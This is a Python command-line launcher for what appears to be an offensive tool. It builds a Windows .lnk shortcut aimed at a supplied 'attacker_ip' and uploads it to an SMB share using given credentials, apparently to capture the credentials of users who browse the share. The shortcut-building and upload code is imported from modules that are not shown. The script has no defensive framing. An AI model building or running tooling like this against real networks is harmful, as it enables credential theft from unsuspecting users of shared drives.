import argparse
from upload_to_smb import upload_lnk_file_to_smb
from banner import print_banner

def main():
    parser = argparse.ArgumentParser(description="Generate and upload a .lnk file to an SMB share.")
    parser.add_argument("attacker_ip", help="The IP address of the attacker.")
    parser.add_argument("share_name", help="The SMB share name.")
    parser.add_argument("username", help="The SMB username.")
    parser.add_argument("password", help="The SMB password.")
    parser.add_argument("server_ip", help="The IP address of the SMB server.")
    parser.add_argument("--domain", default="", help="The SMB domain (optional).")
    parser.add_argument("--file_name", default=None, help="The name of the generated .lnk file (optional).")
    
    args = parser.parse_args()
    
    print_banner()
    upload_lnk_file_to_smb(
        server_ip=args.server_ip,
        username=args.username,
        password=args.password,
        domain=args.domain,
        share_name=args.share_name,
        attacker_ip=args.attacker_ip,
        file_name=args.file_name
    )

if __name__ == "__main__":
    main()
